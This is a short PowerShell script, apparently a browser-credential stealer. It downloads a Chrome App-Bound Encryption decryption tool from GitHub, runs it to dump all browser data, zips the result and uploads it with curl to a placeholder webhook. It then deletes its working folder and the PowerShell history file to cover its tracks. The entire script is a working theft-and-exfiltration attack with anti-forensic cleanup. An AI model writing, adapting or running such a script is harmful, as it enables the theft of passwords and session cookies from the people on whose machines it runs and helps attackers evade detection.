
mkdir "$env:TEMP\work" -Force; cd "$env:TEMP\work"
iwr -Uri "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.20.0/chrome-injector-v0.20.0.zip" -OutFile "data.zip" -UseBasicParsing
Expand-Archive -Path "data.zip" -DestinationPath "ext" -Force
cd ext
.\chromelevator_x64.exe all -f -o out
Compress-Archive -Path "out\*" -DestinationPath "cosa.zip" -Force
curl.exe -F "file=@cosa.zip" "WEBHOOK_HERE"
cd $env:TEMP; rm -Recurse -Force "$env:TEMP\work"
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
exit
